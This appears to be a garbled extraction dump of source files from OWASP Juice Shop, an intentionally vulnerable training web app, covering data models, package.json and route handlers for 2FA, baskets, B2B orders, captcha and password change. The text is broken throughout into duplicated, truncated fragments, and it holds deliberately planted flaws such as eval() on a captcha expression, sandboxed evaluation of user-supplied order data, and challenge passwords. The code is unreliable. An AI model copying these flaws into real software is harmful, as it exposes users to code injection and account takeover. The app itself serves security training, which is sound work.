anonymous feedback posts// no F ... k posts'../lib/noUpdate'_sequelizebelongsToforeignKeyConstraintforeignKey'UserId'belongsToManythrough'BasketId''ProductId''AddressId''SecurityQuestionId'import  ... Update'../lib/noUpdate/lib/noUpdaterelatio ...   })\r\n}(_seque ...   })\r\n}{\r\n  Ad ...   })\r\n}Address ... }\r\n  })Address ... longsToconstraints: trueforeign ... t: trueforeign ... \r\n    }name: 'UserId'BasketM ... }\r\n  })BasketM ... longsToBasketM ... sToManythrough ... emModelas: 'Products'name: 'BasketId'makeKey ... ketId')CardMod ... }\r\n  })CardModel.belongsToComplai ... }\r\n  })Complai ... longsToFeedbac ... }\r\n  })Feedbac ... longsToImageCa ... }\r\n  })ImageCa ... longsToMemoryM ... }\r\n  })MemoryM ... longsToPrivacy ... }\r\n  })Privacy ... longsToProduct ... }\r\n  })Product ... sToManyname: 'ProductId'makeKey ... uctId')Quantit ... }\r\n  })Quantit ... longsToRecycle ... }\r\n  })Recycle ... longsToname: 'AddressId'Securit ... }\r\n  })Securit ... longsToname: ' ... tionId'WalletM ... }\r\n  })WalletM ... longsToexport  ... sInit }P:/My Drive/Git/juice-shop/models/securityAnswer.ts'answer''SecurityAnswers'class S ... ring\r\n}Model<\r ... wer>\r\n>InferAt ... Answer>InferCr ... Answer>const S ... \n  )\r\n}Securit ... \n  )\r\n}{\r\n  Se ... \n  )\r\n}Securit ...  }\r\n  )SecurityAnswer.initunique: trueSecurit ...       }answer: ...       }set (an ...       }this.se ... nswer))securit ... answer)security.hmactableNa ... nswers'SecurityAnswersSecurit ... erModelP:/My Drive/Git/juice-shop/models/securityQuestion.ts'SecurityQuestions'Model<\r ... ion>\r\n>InferAt ... estion>InferCr ... estion>Securit ... on.initquestio ...       }tableNa ... stions'SecurityQuestionsP:/My Drive/Git/juice-shop/models/user.ts vuln-code-snippet start weakPasswordChallenge vuln-code-snippet vuln-line weakPasswordChallenge vuln-code-snippet end weakPasswordChallengeisActiveclearTextPasswordisIngetDataValue'profileImage''/assets/public/images/uploads/default.svg''/assets/public/images/uploads/defaultAdmin.png''role''0.0.0.0''Users''afterValidate'`acc0unt4nt@${'Nice try, but this is not how the "Ephemeral Accountant" challenge works!'class U ... ean>\r\n}Model<\r ... ser>\r\n>InferAt ... s<User>InferCr ... s<User>const U ...   })\r\n}UserMod ...   })\r\n}(sequel ...   })\r\n}{ // vu ...   })\r\n}User.in ...  }\r\n  )User.initusernam ...       }defaultValue: ''set (us ...       }usernam ... ername)securit ... ername)securit ... eLegacythis.se ... ername)email:  ...       }set (em ...       }email = ... (email)securit ... (email)this.se ...  email)passwor ...       }set (cl ...       }this.se ... sword))securit ... ssword)role: { ...       }default ... stomer'isIn: [ ... dmin']][['cust ... dmin']]['custo ... admin']set (ro ...       }const p ... Image')profile ... Image')this.ge ... Image')this.getDataValuerole == ... t.svg')(!profi ... t.svg')!profil ... lt.svg'!profileImageprofile ... lt.svg''/asset ... lt.svg'/assets/public/images/uploads/default.svg'/asset ... in.png'/assets/public/images/uploads/defaultAdmin.png/assets/public/images/uploads/defaultAdminthis.se ... , role)deluxeT ...       }lastLog ...       }default ... .0.0.0'0.0.0.0profile ...       }default ... lt.svg'/assets/public/images/uploads/defaulttotpSec ...       }isActiv ...       }defaultValue: truetableName: 'Users'UsersUser.ad ... }\r\n  })User.addHookafterValidateif (\r\n  ... \r\n    }user.em ... rCase()user.em ... werCase`acc0un ... rCase()`acc0un ... werCase`acc0un ... ain')}`acc0unt4nt@new Err ...       )'Nice t ... works!'Nice try, but this is not how the "Ephemeral Accountant" challenge works!User as UserModelP:/My Drive/Git/juice-shop/models/wallet.tsWallet'Wallets'class W ... ber>\r\n}Model<\r ... let>\r\n>InferAt ... Wallet>InferCr ... Wallet>const W ... \n  )\r\n}WalletM ... \n  )\r\n}{\r\n  Wa ... \n  )\r\n}Wallet. ...  }\r\n  )Wallet.initbalance ...       }defaultValue: 0tableName: 'Wallets'WalletsWallet  ... etModelP:/My Drive/Git/juice-shop/package.json"juice-shop"juice-shop"Probab ... cation""Probably the most modern and sophisticated insecure web application""web security"web security"web ap ... curity"web application security"web application security""webappsec"webappsec"owasp""pentest"pentest"pentesting"pentesting"security""vulnerable"vulnerable"vulnerability"vulnerability"broken"broken"bodgeit""ctf""capture the flag"capture the flag"awareness"awareness"https: ... e.shop"https://owasp-juice.shop"https://owasp-juice.shop"homepage{\r\n     ... s"\r\n  }"https: ... issues"https://github.com/juice-shop/juice-shop/issues"https://github.com/juice-shop/juice-shop/issues"bugs{\r\n     ... t"\r\n  }"git"git"https: ... op.git"https://github.com/juice-shop/juice-shop.git"https://github.com/juice-shop/juice-shop.git""MIT"MITlicense"Bj\u00f6rn  ... ch.de)"Bjrn Kimminich <bjoern.kimminich@owasp.org> (https://kimminich.de)"Bjrn Kimminich <bjoern.kimminich@owasp.org> (https://kimminich.de)"[\r\n     ... ."\r\n  ]"Bj\u00f6rn Kimminich"Bjrn Kimminich"Bjrn Kimminich""Jannik Hollenbach"Jannik Hollenbach"Aashish683"Aashish683"greenkeeper[bot]"greenkeeper[bot]"MarcRler"MarcRler"agrawalarpit14"agrawalarpit14"Scar26"Scar26"ShubhamPalriwala"ShubhamPalriwala"CaptainFreak"CaptainFreak"JuiceShopBot""Supratik Das"Supratik Das"the-pro"the-pro"Ziyang Li"Ziyang Li"Timo Pagel"Timo Pagel"aaryan10"aaryan10"..."contributors{\r\n     ... l"\r\n  }"cd fro ... =false"cd frontend && node ./node_modules/@angular/cli/bin/ng build --aot --configuration production --output-hashing=none --vendor-chunk=true --source-map=false"cd frontend && node ./node_modules/@angular/cli/bin/ng build --aot --configuration production --output-hashing=none --vendor-chunk=true --source-map=false"build:frontend"tsc"tscbuild:server"cypress open"cypress opencypress:open"cypress run"cypress runcypress:run"nyc -- ... ceExit"nyc --report-dir=./build/reports/coverage/api-tests jest --silent --runInBand --forceExit"nyc --report-dir=./build/reports/coverage/api-tests jest --silent --runInBand --forceExit"frisby"cd fro ...  cd .)"cd frontend && npm install --legacy-peer-deps && cd .. && npm run build:frontend && (npm run --silent build:server || cd .)"cd frontend && npm install --legacy-peer-deps && cd .. && npm run build:frontend && (npm run --silent build:server || cd .)""eslint ...  cd .."eslint *.ts data lib models routes test/**/*.ts views && cd frontend && ng lint && npx stylelint "**/*.scss" && cd .."eslint *.ts data lib models routes test/**/*.ts views && cd frontend && ng lint && npx stylelint \"**/*.scss\" && cd ..""schema ... ma.yml"schema validate -s config.schema.yml"schema validate -s config.schema.yml"lint:configeslint *.ts data lib models routes test/**/*.ts views rsn --fix && cd frontend && ng lint --fix && npx stylelint "**/*.scss" --fix && cd .."eslint *.ts data lib models routes test/**/*.ts views rsn --fix && cd frontend && ng lint --fix && npx stylelint \"**/*.scss\" --fix && cd .."lint:fix"grunt package"grunt package"npm pr ... ackage"npm prune --production && npm dedupe && cd frontend && npm prune --legacy-peer-deps --production && cd .. && npm run --silent sbom && grunt package"npm prune --production && npm dedupe && cd frontend && npm prune --legacy-peer-deps --production && cd .. && npm run --silent sbom && grunt package"package:ci"concur ... erve\""concurrently --kill-others "ts-node app.ts" "cd frontend && ng serve""concurrently --kill-others \"ts-node app.ts\" \"cd frontend && ng serve\""concurrently --kill-others "ts-node-dev app.ts" "cd frontend && ng serve""concurrently --kill-others \"ts-node-dev app.ts\" \"cd frontend && ng serve\""serve:dev"node build/app"node build/app"cd fro ... server"cd frontend && ng test --watch=false --source-map=true && cd .. && npm run test:server"cd frontend && ng test --watch=false --source-map=true && cd .. && npm run test:server"cd frontend && ng test --watch=false --source-map=false --browsers=ChromiumHeadless && cd .. && npm run test:server"cd frontend && ng test --watch=false --source-map=false --browsers=ChromiumHeadless && cd .. && npm run test:server"test:chromium"nyc -- ... */*.ts"nyc --report-dir=./build/reports/coverage/server-tests mocha -r ts-node/register -r source-map-support/register --recursive test/server/**/*.ts"nyc --report-dir=./build/reports/coverage/server-tests mocha -r ts-node/register -r source-map-support/register --recursive test/server/**/*.ts"test:server"npm run frisby"test:api"ts-node rsn/rsn.ts"ts-node rsn/rsn.tsrsn"ts-nod ... ose.ts"ts-node rsn/rsn-verbose.ts"ts-node rsn/rsn-verbose.ts"rsn:verbose"ts-nod ... ate.ts"ts-node rsn/rsn-update.ts"ts-node rsn/rsn-update.ts"rsn:update"cd vag ... ant up"cd vagrant && vagrant up"cd vagrant && vagrant up"vagrant"npm ru ... om:xml"npm run sbom:json && npm run sbom:xml"npm run sbom:json && npm run sbom:xml"sbom"cyclon ... m.json"cyclonedx-npm --omit=dev --output-format=JSON --output-file=bom.json"cyclonedx-npm --omit=dev --output-format=JSON --output-file=bom.json"sbom:json" cyclo ... om.xml" cyclonedx-npm --omit=dev --output-format=XML  --output-file=bom.xml" cyclonedx-npm --omit=dev --output-format=XML  --output-file=bom.xml"sbom:xml"ts-jest"ts-jestpresetdiagnostics"./test ... tup.ts"./test/apiTestsSetup.ts"./test/apiTestsSetup.ts"globalSetup"./test ... own.ts"./test/apiTestsTeardown.ts"./test/apiTestsTeardown.ts"globalTeardown"/build"/buildmodulePathIgnorePatterns"./test ... est.ts"./test/apiTestsSetupJest.ts"./test/apiTestsSetupJest.ts"setupFilesAfterEnv"<rootD ... .[jt]s"<rootDir>/test/api/*Spec.[jt]s"<rootDir>/test/api/*Spec.[jt]s"testMatch"/node_modules/"/node_modules/"/front ... dules/"/frontend/node_modules/"/frontend/node_modules/"testPathIgnorePatterns"http://localhost"http://localhosttestURL"@istan ... script"@istanbuljs/nyc-config-typescript"@istanbuljs/nyc-config-typescript""lib/*.ts"lib/*.ts"models/*.ts""routes/*.ts""server.ts""lcov"lcov"text-summary"text-summarynyc{\r\n     ... 2"\r\n  }"^1.20.2"^1.20.2body-parser"^2.0.6"^2.0.6"^0.12.5"^0.12.5"1.4.0"1.4.0"^1.7.4"^1.7.4compression"^3.3.9"^3.3.9"^1.4.5"^1.4.5cookie-parser"^2.8.5"^2.8.5dottie"^8.0.0"^8.0.0"^1.5.1"^1.5.1"^6.7.0"^6.7.0exif"^4.17.1"^4.17.1"^1.2.0"^1.2.0express-ipfilter"^5.3.0"^5.3.0express-rate-limit"^0.4.1"^0.4.1express-robots-txt"^2.0.0"^2.0.0express-security.txt"^0.5.0"^0.5.0feature-policy"^0.5.7"^0.5.7file-stream-rotator"^16.1.0"^16.1.0file-type"^1.0.3"^1.0.3filesniffer"^1.1.1"^1.1.1finale-rest"^9.0.1"^9.0.1"^1.3.0"^1.3.0"^10.3.10"^10.3.10"^4.2.6"^4.2.6graceful-fs"^1.2.1"^1.2.1"^1.6.0"^1.6.0"^0.1.0"^0.1.0hashids"^4.0.4"^4.0.4hbs"^4.0.0"^4.0.0helmet"^1.3.1"^1.3.1"^0.11.1"^0.11.1i18n"^3.14.0"^3.14.0"^3.1.1"^3.1.1"~0.8.0"~0.8.0"^1.0.11"^1.0.11libxmljs"^0.6.11"^0.6.11"^0.0.2"^0.0.2"^1.10.0"^1.10.0morgan"^1.4.5-lts.1"^1.4.5-lts.1multer"^0.15.0"^0.15.0node-pre-gyp"^1.3.3"^1.3.3notevil"^2.3.0"^2.3.0on-finished"^0.11.0"^0.11.0pdfkit"^14.1.0"^14.1.0prom-client"^3.0.0"^3.0.0pug"^2.88.2"^2.88.2"^1.6.3"^1.6.3"^7.3.2"^7.3.2"^6.15.1"^6.15.1"^1.9.1"^1.9.1serve-index"^5.0.8"^5.0.8sqlite3svg-captcha"^5.0.0"^5.0.0swagger-ui-express"^4.0.3"^4.0.3web3"^3.3.3"^3.3.3yaml-schema-validator"^1.12.0"@cyclonedx/cyclonedx-npm"^1.0.1"^1.0.1"^4.2.14"^4.2.14@types/chai"^7.1.3"^7.1.3@types/chai-as-promised"^0.12.1"^0.12.1@types/clarinet@types/compression@types/config"^1.4.2"^1.4.2@types/cookie-parser"^2.8.9"^2.8.9@types/cors"^6.0.2"^6.0.2@types/cross-spawn"^1.1.3"^1.1.3@types/cypress"^8.0.5"^8.0.5@types/download"^1.5.0"^1.5.0@types/errorhandler"^0.6.3"^0.6.3@types/exif"^4.17.11"^4.17.11@types/express@types/express-jwt@types/frisby"^9.0.6"^9.0.6@types/fs-extra"^7.1.6"^7.1.6@types/glob"^4.1.5"^4.1.5@types/graceful-fs"^0.12.0"^0.12.0@types/i18n"^26.0.20"^26.0.20@types/jest"^3.12.6"^3.12.6@types/js-yaml"^8.5.0"^8.5.0@types/jsonwebtoken"^3.2.5"^3.2.5@types/jws"^8.1.1"^8.1.1@types/mocha"^1.9.2"^1.9.2@types/morgan@types/multer"^2.3.1"^2.3.1@types/on-finished"^0.10.6"^0.10.6@types/pdfkit"^2.1.0"^2.1.0@types/portscanner"^2.0.4"^2.0.4@types/pug"^2.48.5"^2.48.5@types/request"^1.27.0"^1.27.0@types/sanitize-html"^7.3.4"^7.3.4@types/semver"^4.28.11"^4.28.11@types/sequelize"^1.7.30"^1.7.30@types/serve-index"^10.0.4"^10.0.4@types/sinon@types/sinon-chai"^2.1.13"^2.1.13@types/socket.io"^1.4.35"^1.4.35"^4.1.2"^4.1.2@types/swagger-ui-express"^0.10.3"^0.10.3@types/unzipper"^13.1.3"^13.1.3@types/validator"6.18.1"6.18.1"^4.2.0"^4.2.0chai"^7.1.1"^7.1.1chai-as-promisedconcurrently"^7.0.3"^7.0.3cross-spawn"^13.6.1"^13.6.1"https: ... by.git"https://github.com/bkimminich/frisby.git"https://github.com/bkimminich/frisby.git""^1.3.2"^1.3.2grunt-cli"^0.12.3"^0.12.3http-server"^2.5.0"^2.5.0jasmine-reporters"^26.6.3"^26.6.3"^2.6.13"^2.6.13node-fetch"^0.8.4"^0.8.4shelljs"^11.1.2"^11.1.2sinon"^3.7.0"^3.7.0sinon-chai"^0.5.19"^0.5.19source-map-support"^26.5.0"^26.5.0"^1.1.6"^1.1.6ts-node-dev"~4.6.0"~4.6.0"18 - 21"18 - 21[\r\n     ... d"\r\n  ]"win32""linux""darwin"darwin"freebsd"freebsd"openbsd"openbsd[\r\n     ... m"\r\n  ]"x64"x64"x32"x32"arm64"arm64"arm"armheroku-run-build-script"angular"angular"inject"standardP:/My Drive/Git/juice-shop/routes/2fa.tsP:/My Drive/Git/juice-shop/routes Accepts tokens as valid even when they are 30sec to old or to new// Acce ...  to new This is a standard as the clocks of the authenticator and server might not align perfectly.// This ... fectly. @ts-expect-error FIXME set new property for original basket// @ts- ...  basket keep track of original basket for challenge solution check// keep ... n check
 * Check the 2FA status of the currently signed-in user.
 *
 * When 2FA is not set up, the result will include data required to start the setup.
 /**\r\n * ... p.\r\n */
 * Sets Up 2FA for a User
 * Requires 3 params:
 * 1. The Users Password as a confirmation.
 * 2. A Setup token. This is returned by the status endpoint.
 *    This contains a signed TOTP secret to ensure that the secret
 *    was generated by the server and wasn't tampered with by the client
 * 3. The first TOTP Token, generated by the TOTP App. (e.g. Google Authenticator)
 /**\r\n * ... r)\r\n */ Update db model and cached object// Upda ...  object
 * Disables 2fa for the current user
 'password_valid_needs_second_factor_token''Invalid token type'findByPk'No such user found!'plainUser'wurstbrot@'findOrCreate'You need to be logged in to see this'generateSecret'totp_setup_secret''Need to login before setting up 2FA''Password doesnt match stored password''User has 2fa already setup''SetupToken is of wrong type''Initial token doesnt match the secret from the setupToken'userModelCheck the 2FA status of the currently signed-in user.

When 2FA is not set up, the result will include data required to start the setup.Sets Up 2FA for a User
Requires 3 params:
1. The Users Password as a confirmation.
2. A Setup token. This is returned by the status endpoint.
This contains a signed TOTP secret to ensure that the secret
was generated by the server and wasn't tampered with by the client
3. The first TOTP Token, generated by the TOTP App. (e.g. Google Authenticator)Disables 2fa for the current userimport  ... Utils')require ... Utils')const s ... urity')securit ... urity')require ... urity')const o ... tplib')otplib  ... tplib')require('otplib')otplib. ... w: 1\r\n}otplib. ... options{\r\n  // ... w: 1\r\n}window: 1const { ... eq.body{ tmpTo ... eq.body{ tmpTo ... Token }try {\r\n ... ()\r\n  }const { ... pToken){ userI ... pToken){ userId, type }securit ... pToken)security.verifysecurity.decodetype != ... _token''passwo ... _token'password_valid_needs_second_factor_tokenthrow n ...  type')new Err ...  type')Invalid token typeconst u ... userId)user =  ... userId)await U ... userId)UserMod ... userId)UserModel.findByPkif (use ... \r\n    }user == null'No suc ... found!'No such user found!const i ... Secret)isValid ... Secret)otplib. ... Secret)otplib. ... r.checkuser.totpSecretconst p ... n(user)plainUs ... n(user)utils.q ... n(user)!isValidreturn  ... .send()res.status(401).sendchallen ... in') })() => { ... ain') }{ retur ... ain') }return  ... omain')user.em ... omain')'wurstb ... omain')wurstbrot@const [ ... Id } })[basket ... Id } })[basket]await B ... Id } })BasketM ... Id } })BasketM ... rCreate{ UserId: userId }UserId: userIdconst t ... inUser)token = ... inUser)securit ... inUser)security.authorizeplainUs ... sket.idplainUser.bidbasket.idsecurit ... ers.putres.jso ... il } }){ authe ... ail } }authent ... email }{ token ... email }bid: basket.idumail: user.emailcatch ( ... ()\r\n  }const d ... om(req)data =  ... om(req)throw n ...  this')new Err ...  this')'You ne ... e this'You need to be logged in to see thisconst { ...  = data{ data: ...  = data{ data: user }data: useruser.to ...  === ''const s ... ecret()secret  ... ecret()otplib. ... ecret()otplib. ... eSecretres.jso ...      })email: user.emailsetupTo ...      })securit ...      })type: ' ... secret'totp_setup_secretthrow n ... p 2FA')new Err ... p 2FA')'Need t ... up 2FA'Need to login before setting up 2FA{ passw ... eq.body{ passw ... Token }user.pa ... ssword)user.passwordthrow n ... sword')new Err ... sword')'Passwo ... ssword'Password doesnt match stored passworduser.to ...  !== ''throw n ... setup')new Err ... setup')'User h ...  setup'User has 2fa already setup{ secre ... pToken){ secret, type }type != ... secret''SetupT ... g type'SetupToken is of wrong typeif (!ot ... \r\n    }!otplib ... secret)otplib. ... secret)throw n ... Token')new Err ... Token')'Initia ... pToken'Initial token doesnt match the secret from the setupTokenconst u ... ser.id)userMod ... ser.id)await U ... ser.id)UserMod ... ser.id)userModel == nulluserMod ...  secretuserModel.totpSecretawait u ... .save()userModel.save()userModel.savesecurit ... Model))securit ... ateFromutils.q ... rModel)res.status(200).sendres.status(200)userMod ... et = ''module. ... disable() => disablemodule. ...  verifymodule. ... .verify() => verifymodule. ...  statusmodule. ... .status() => statusmodule. ... > setupmodule.exports.setup() => setupP:/My Drive/Git/juice-shop/routes/address.tsfindOne'Malicious activity detected.''Address deleted successfully.'const a ... Id } })address ... Id } })await A ... Id } })Address ... Id } })AddressModel.findAll{ UserI ... serId }res.sta ... sses })res.status(200).json{ statu ... esses }status: 'success'data: addressesmodule. ... essByIdAddressModel.findOne{ id: r ... serId }id: req.params.idreq.params.idreq.paramsif (add ... \r\n    }res.sta ... ress }){ statu ... dress }data: addressres.sta ... ed.' })res.status(400).json{ statu ... ted.' }data: ' ... ected.''Malici ... ected.'Malicious activity detected.AddressModel.destroyres.sta ... ly.' }){ statu ... lly.' }data: ' ... fully.''Addres ... fully.'Address deleted successfully.Address deleted successfullyP:/My Drive/Git/juice-shop/routes/angular.tsserveAngularClient'/api''/rest'sendFile'Unexpected path: 'import  ... 'path')({ url  ...  }\r\n  }if (!ut ... \r\n    }!utils. ... /rest')!utils. ... '/api')utils.s ... '/api')utils.startsWith/apiutils.s ... /rest')/restres.sen ... html'))res.sendFilepath.re ... .html')next(ne ... + url))new Err ...  + url)'Unexpe ... ' + urlUnexpected path: P:/My Drive/Git/juice-shop/routes/appConfiguration.tsretrieveAppConfiguration_reqretriev ... uration(_req:  ... })\r\n  }res.json({ config }){ config }P:/My Drive/Git/juice-shop/routes/appVersion.tsretrieveAppVersion'application.showVersionNumber'res.jso ... \n    })version ... () : ''config. ... () : ''config. ... umber')'applic ... Number'application.showVersionNumberP:/My Drive/Git/juice-shop/routes/authenticatedUsers.tsretrieveUserListuserTokenparsedTokendataValues/./gtry {\r\n ... r)\r\n  }const u ... ndAll()users = ... ndAll()await U ... ndAll()UserModel.findAll()UserModel.findAlldata: u ...      })users.m ...      })(user)  ...       }const u ... f(user)userTok ... f(user)securit ... f(user)securit ... tokenOflet las ...  = nulllastLog ...  = nullconst p ... true })parsedT ... true })decode( ... true }){ json: true }json: truelastLog ...  : nullparsedT ...  : nullMath.fl ... Time())new Dat ... tTime()new Dat ... getTimenew Dat ... * 1000)parsedT ...  * 1000parsedToken?.iat0 * 1000...user.dataValuesuser.dataValuespasswor ... g, '*')user.pa ... g, '*')user.pa ... replacetotpSec ... g, '*')user.to ... g, '*')user.to ... replacecatch ( ... r)\r\n  }next(error)export  ... serList() => r ... serListP:/My Drive/Git/juice-shop/routes/b2bOrder.ts'vm'safeEval'notevil'b2bOrderorderLinesData'safeEval(orderLinesData)'ciduniqueOrderNumberpaymentDuedateTwoWeeksFromNow/Script execution timed out.*/503'Sorry, we are temporarily not available! Please try again later.''Infinite loop detected - reached max iterations'}_B2B`import  ... e('vm')require('vm')const s ... tevil')safeEva ... tevil')require('notevil')({ body ...  }\r\n  }{ body }const o ... a || ''orderLi ... a || ''body.or ... a || ''body.orderLinesDataconst s ... sData }sandbox ... sData }{ safeE ... sData }vm.crea ... andbox)vm.runI ... 2000 })'safeEv ... sData)'safeEval(orderLinesData)(orderLinesData){ timeout: 2000 }timeout: 2000res.jso ... ow() }){ cid:  ... Now() }cid: body.cidbody.cidorderNo ... umber()uniqueOrderNumber()payment ... omNow()dateTwo ... omNow()utils.g ... != nullutils.g ... out.*/)utils.g ... ).match/Script ...  out.*/Script execution timed out.*Script execution timed outres.status(503)next(ne ... ter.'))new Err ... ater.')'Sorry, ... later.'Sorry, we are temporarily not available! Please try again later.Sorry, we are temporarily not available! Please try again laterchallen ... ons' })() => { ... ions' }{ retur ... ions' }return  ... ations'utils.g ... ations''Infini ... ations'Infinite loop detected - reached max iterationsnext(err)functio ... `)\r\n  }return  ... }_B2B`)securit ... }_B2B`)`${(new ... )}_B2B`(new Da ... tring()(new Da ... oString(new Date())_B2Bfunctio ... ()\r\n  }new Dat ...  1000))new Date().getTime()new Date().getTime(14 * 2 ... * 1000)14 * 24 ...  * 100014 * 24 * 60 * 6014 * 24 * 6014 * 24P:/My Drive/Git/juice-shop/routes/basket.ts jshint eqeqeq:false /* jshi ... alse */ eslint-disable-line eqeqeq// esli ...  eqeqeqretrieveBasket'null''NaN'const i ... rams.idid = req.params.idBasketM ...   .thenBasketM ... ' }] })BasketModel.findOne{ where ... s' }] }where: { id }include ... cts' }][{ mode ... cts' }]{ model ... ucts' }model: ProductModelparanoid: falseBasketModel | nullreturn  ... d != iduser && ... d != iduser && ... ser.biduser && ... = 'NaN'user && ...  'null'user && ... efined'user && idid !== 'undefined'id !== 'null'id !== 'NaN'user.biduser.bid != idif (((b ...       }((baske ... gth > 0((baske ... = null)(basket ... != null(basket?.Products)basket?.Productsbasket. ... gth > 0basket. ... .lengthi < bas ... .lengthbasket. ... ].name)basket. ... i].namebasket.Products[i]res.jso ... asket))utils.q ... basket)P:/My Drive/Git/juice-shop/routes/basketItems.ts is product limited per user and order, except if user is deluxe?// is p ... deluxe? enough in stock?// enough in stock?RequestWithRawBodyrawBodyproductIdsbasketIds'{\'error\' : \'Invalid BasketId\'}'basketItemInstanceaddedBasketItemquantityCheck'No such item found!''No such product found!''We are out of stock! Sorry for the inconvenience.''You can order only up to {{quantity}} items of this product.'rawBody: stringmodule. ... ketItemconst r ... awBody)result  ... awBody)utils.p ... awBody)utils.p ... nCustomreq.rawBodyconst p ... ds = []productIds = []const basketIds = []basketIds = []const q ... es = []quantities = []i < result.lengthresult[ ... ductId'result[i].keyresult[i]product ... .value)productIds.pushresult[i].valueresult[ ... sketId'basketI ... .value)basketIds.pushresult[ ... antity'quantit ... .value)quantities.pushuser && ... Ids[0])user && basketIds[0]basketIds[0]basketI ... efined'Number( ... Ids[0])Number(user.bid)Number(basketIds[0]){ // es ... \r\n    }res.sta ... Id\'}')'{\'err ... tId\'}'{'error' : 'Invalid BasketId'}const b ...       }basketI ...       }Product ... th - 1]product ... th - 1]product ... gth - 1productIds.lengthBasketI ... th - 1]basketI ... th - 1]basketIds.length - 1basketIds.lengthquantit ... th - 1]quantit ... gth - 1quantities.lengthchallen ... etId })() => { ... ketId }{ retur ... ketId }return  ... asketIduser && ... asketIduser.bi ... asketIdconst b ... etItem)basketI ... etItem)BasketI ... l.buildbasketI ...      })basketI ... ).catchbasketI ... ().thenbasketI ... .save()basketI ... ce.save(addedB ...       }res.jso ... Item }){ statu ... tItem }data: a ... ketItemmodule. ... dditionvoid qu ... \n    })quantit ... \n    })quantit ... ).catchquantit ... antity)req.body.ProductIdreq.body.quantity(error: ... \r\n    }module. ... mUpdateBasketI ... \n    })BasketI ... }).thenBasketI ... id } })BasketI ... findOne{ where ... .id } }where:  ... ms.id }{ id: r ... ms.id }(item:  ... \r\n    }BasketI ...  | nullreq.body.BasketIdif (req ...       }if (ite ...       }item == nullNo such item found!void qu ... antity)const p ... id } })product ... id } })await Q ... id } })Quantit ... id } })Quantit ... findOne{ where ...  id } }where:  ... d: id }{ ProductId: id }if (pro ... ')\r\n  }product == nullNo such product found!if (!pr ... })\r\n  }!produc ... xe(req)!produc ... antity)!produc ... PerUser(produc ... antity)securit ... xe(req)security.isDeluxe{ // en ... \r\n    }res.sta ... e.') }){ error ... ce.') }error:  ... ence.')res.__( ... ence.')res.__'We are ... ience.'We are out of stock! Sorry for the inconvenience.We are out of stock! Sorry for the inconvenienceres.sta ... ) }) }){ error ... () }) }error:  ... ng() })res.__( ... ng() })'You ca ... oduct.'You can order only up to {{quantity}} items of this product.{ quant ... ing() }quantit ... tring()product ... tring()product ... oStringP:/My Drive/Git/juice-shop/routes/captcha.ts eslint-disable-line no-eval// esli ... no-eval'../models/captcha'captchaslocalsoperators'+'firstTermsecondTermthirdTermfirstOperatorsecondOperatorcaptchaInstanceverifyCaptcha'Wrong answer to CAPTCHA. Please try again.'type Captcha../models/captcha/models/captchareturn  ... a)\r\n  }async ( ... a)\r\n  }const c ... chaId++captcha ... chaId++req.app ... chaId++req.app ... ptchaIdreq.app.localsreq.appconst o ... ', '-']operato ... ', '-']['*', '+', '-']const f ... 0) + 1)firstTe ... 0) + 1)Math.fl ... 0) + 1)(Math.r ... 10) + 1(Math.random() * 10)Math.random() * 10const s ... 0) + 1)secondT ... 0) + 1)const t ... 0) + 1)thirdTe ... 0) + 1)const f ...  * 3))]firstOp ...  * 3))]operato ...  * 3))]Math.fl ... ) * 3))(Math.random() * 3)Math.random() * 3const s ...  * 3))]secondO ...  * 3))]const e ... tring()express ... tring()firstTe ... tring()firstTe ... peratorfirstTerm.toString()firstTerm.toStringsecondT ... tring()secondTerm.toStringthirdTerm.toString()thirdTerm.toStringconst a ... tring()answer  ... tring()eval(ex ... tring()eval(ex ... oStringeval(expression)const c ... \r\n    }captcha ... \r\n    }captcha: expressionconst c ... aptcha)captcha ... aptcha)Captcha ... aptcha)CaptchaModel.buildawait c ... .save()captcha ... .save()captchaInstance.saveres.json(captcha)captcha ...   })\r\n}() => ( ...   })\r\n}(req: R ...   })\r\n}{\r\n  Ca ...   })\r\n}Captcha ... )\r\n  })Captcha ... ).catchCaptcha ... }\r\n  })Captcha ... }).thenCaptcha ... Id } })CaptchaModel.findOne{ where ... aId } }where:  ... chaId }{ captc ... chaId }captcha ... ptchaIdreq.body.captchaId(captch ...  }\r\n  }Captcha | nullif ((ca ... \r\n    }(captch ... .answer(captcha != null)captcha != nullreq.bod ... .answerreq.body.captchacaptcha.answerres.sta ... ain.'))res.__( ... gain.')'Wrong  ... again.'Wrong answer to CAPTCHA. Please try again.Wrong answer to CAPTCHA Please try again(error: ... r)\r\n  }module. ... aptchasP:/My Drive/Git/juice-shop/routes/changePassword.tsnewPasswordInString'Password cannot be empty.''New and repeated password do not match.''Bearer='loggedInUser'Current password is not correct.''slurmCl4ssic''Blocked illegal activity by 'const c ... cache')cache = ... cache')require ... cache')const c ... llengescache.challenges({ quer ...  }\r\n  }{ query ... ction }const c ... currentcurrent ... currentquery.currentconst n ... ery.newnewPass ... ery.newquery.newconst n ... tring()newPass ... tring()newPass ... oStringconst r ... .repeatrepeatP ... .repeatquery.repeatif (!ne ... \r\n    }!newPas ... efined'!newPasswordnewPass ... efined'res.sta ... pty.'))res.__( ... mpty.')'Passwo ... empty.'Password cannot be empty.Password cannot be emptynewPass ... asswordres.sta ... tch.'))res.__( ... atch.')'New an ... match.'New and repeated password do not match.New and repeated password do not matchconst t ...  : nulltoken = ...  : nullheaders ...  : nullheaders ... length)headers ... .substr'Bearer='.lengthBearer=const l ... (token)loggedI ... (token)securit ... (token)securit ... ers.getif (cur ...       }current ... asswordsecurit ... asswordloggedI ... asswordloggedInUser.datares.sta ... ect.'))res.__( ... rect.')'Curren ... rrect.'Current password is not correct.Current password is not correctUserMod ... d).thenUserMod ... ata.id)loggedInUser.data.id(user:  ...       }UserModel | nulluser != nulluser.up ...      })user.up ... ).catchuser.up ... }).thenuser.up ... ring })user.update{ passw ... tring }passwor ... nStringchallen ... ic') })() => { ... sic') }{ retur ... sic') }return  ... 4ssic')user.id ... 4ssic')user.id ... assworduser.id === 3!currentPassworduser.pa ... 4ssic')securit ... 4ssic')slurmCl4ssicres.json({ user }){ user }next(ne ... dress))new Err ... ddress)'Blocke ... Address'Blocke ... ty by 'Blocked illegal activity by connect ... AddressP:/My Drive/Git/juice-shop/routes/chatbot.ts @ts-expect-error FIXME unclean usage of any type as index// @ts- ... s index @ts-expect-error FIXME some properties missing in updatedUserResponse// @ts- ... 